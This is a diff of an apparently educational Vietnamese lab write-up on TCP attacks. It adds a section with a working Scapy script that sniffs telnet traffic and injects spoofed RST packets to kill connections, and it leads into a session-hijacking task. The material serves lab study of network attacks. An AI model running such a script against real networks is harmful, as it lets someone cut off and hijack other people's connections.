@@ -332,7 +332,28 @@ sniff(iface="br-96b833532993", store=False, filter="tcp and port 23", prn=attack
 ![image](https://user-images.githubusercontent.com/44528004/142776501-9a3285a0-0c64-4074-957c-fdbba6857693.png)
 > Ngay lập tức mất kết nối!
 
+### Attack bằng reset flag
 
+- Tương tự với cách làm trên ta có thể sử dụng reset flag để terminate connection 
+
+- Attack Script
+
+```python
+#! /bin/python3
+from scapy.all import *
+
+
+def attack(packet):
+    ip = IP(src=packet[IP].dst, dst=packet[IP].src)  
+    tcp = TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, seq=packet[TCP].ack, flags='R')
+    reset_pkt = ip / tcp
+    send(reset_pkt)
+
+
+sniff(iface="br-9132eaaddac6", store=False, filter="tcp and port 23", prn=attack)
+```
+
+> Cho kết quả tương tự như trên
 ## Task3: TCP Session Hijacking
 ### Attack
 Từ mô hình của task 2 và tấn công terminate connection thì ta dễ dàng thực hiện inject conmmand bằng cách thay đổi payload của gói PSH-ACK.
